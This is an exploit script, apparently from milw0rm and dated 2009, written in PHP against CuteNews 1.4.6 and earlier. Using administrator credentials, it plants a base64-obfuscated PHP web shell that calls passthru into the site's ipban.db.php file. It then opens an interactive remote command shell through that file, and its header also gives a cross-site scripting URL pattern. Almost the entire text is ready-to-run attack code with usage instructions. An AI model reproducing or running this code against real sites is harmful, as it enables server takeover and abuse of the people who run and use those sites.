<html><head><title>CuteNews <= 1.4.6 (ip ban) XSS/Command Execution Exploit (adm req.)</title></head><pre>#!/usr/bin/php -q
&lt;?php

/*********************************************************************
 * CuteNews &lt;= 1.4.6 (ip ban) XSS / Remote Command Execution Exploit *
 * by athos - staker[at]hotmail[dot]it                               *
 * http://cutephp.com                                                *
 *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*
 * Remote Command Execution                                          *
 *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*
 * you need a super account (administrator)                          *
 * so you can write in ipban.db.php anything ;)                      *
 *                                                                   *
 * works regardless of php.ini settings! enjoy your ais              *
 * note: this vuln is a privilege escalation                         *  
 *                                                                   *
 *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*
 * Cross Site Scripting                                              *
 *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*           
 * http://[host]/[path]//index.php?mod=[Javascript Code]             *
 *********************************************************************/

error_reporting(0);

list($cli,$host,$path,$username,$password) = $argv;

if ($argc != 5) {  
    
    print &quot;\n+-------------------------------------------------------------+\n&quot;;
    print &quot;\r| CuteNews &lt;= 1.4.6 (ip ban) Remote Command Execution Exploit |\n&quot;;
    print &quot;\r+-------------------------------------------------------------+\n&quot;;
    print &quot;\rby athos - staker[at]hotmail[dot]it / http://cutephp.com\n\n&quot;;
    print &quot;\rUsage: php xpl.php [host] [path] [username] [password]\n\n&quot;;
    print &quot;\rhost     + localhost\n&quot;;
    print &quot;\rpath     + /cutenews\n&quot;;
    print &quot;\rusername + admin username\n&quot;;
    print &quot;\rpassword + admin password\n\n&quot;;
    exit;      
}         

exploit();

function login () {
    
    global $username,$password;
    
    $cookies .= &quot;username={$username}; md5_password=&quot;;
    $cookies .= md5($password);
     
    return $cookies;
}    


function check_login() {
    
    global $host,$path;
    
    $auth .= login();
    
    $data .= &quot;GET /{$path}/index.php HTTP/1.1\r\n&quot;;
    $data .= &quot;Host: {$host}\r\n&quot;;
    $data .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
    $data .= &quot;Cookie: $auth;\n&quot;;
    $data .= &quot;Connection: close\r\n\r\n&quot;;
    
    if (preg_match('/Welcome/i',$data)) {
        return true;
    }
    else {
        die(&quot;Login Failed\n&quot;);
    }    
}


function exploit() {

    global $host,$path;
    
    $login  = login();
    $shell = &quot;PD9waHAgDQpwYXNzdGhydSgkX0dFVFsnYyddKTsgDQo/Pg==&quot;;
    
    $shell = base64_decode($shell);
    $post  = &quot;add_ip={$shell}&amp;action=add&amp;mod=ipban&quot;;
    
    $data .= &quot;POST /{$path}/index.php HTTP/1.1\r\n&quot;;
    $data .= &quot;Host: {$host}\r\n&quot;;
    $data .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
    $data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
    $data .= &quot;Cookie: $login\r\n&quot;;
    $data .= &quot;Referer: http://{$host}/{$path}/index.php\r\n&quot;;
    $data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $data .= &quot;Content-Length: &quot;.strlen($post).&quot;\r\n\r\n&quot;;
    $data .= &quot;{$post}\r\n\r\n&quot;;
           
    if (eregi('passthru',data_send($host,$data))) {
        yeat_shell();
    }
    else {
        die(&quot;Exploit Failed!\n&quot;);
    }                 
}


function yeat_shell() {
    
    while (1) {
        echo &quot;yeat[shell]~$: &quot;; 
        $exec = stripslashes(trim(fgets(STDIN)));  
        
        if (preg_match('/^(exit|--exit|quit|--quit)$/i',$exec)) die(&quot;\nExited\n&quot;);
        if (preg_match('/^(help|--help)$/i',$exec)) echo(&quot;\nExample: uname -a\n&quot;);
        if (preg_match('/^(about|--about)$/i',$exec)) echo(&quot;\nstaker[at]hotmail[dot]it\n&quot;);
        
        print data_exec($exec);     
    }
}


function data_exec($exec) {
    
    global $host,$path;
    
    $exec = urlencode($exec);
    $data .= &quot;GET /{$path}/data/ipban.db.php?c={$exec} HTTP/1.1\r\n&quot;;
    $data .= &quot;Host: {$host}\r\n&quot;;
    $data .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
    $data .= &quot;Connection: close\r\n\r\n&quot;;
    
    $html = data_send ($host,$data);
    $html = str_replace('|0||',null,$html);
    return $html;
}


function data_send ($host,$data) {
   
    if (!$sock = @fsockopen($host,80)) {
        die(&quot;Connection refused,try again!\n&quot;);
    }   fputs($sock,$data);
    
    while (!feof($sock)) { $html .= fgets($sock); }
    
    fclose($sock);
    return $html;
}   

# milw0rm.com [2009-01-08]</pre></html>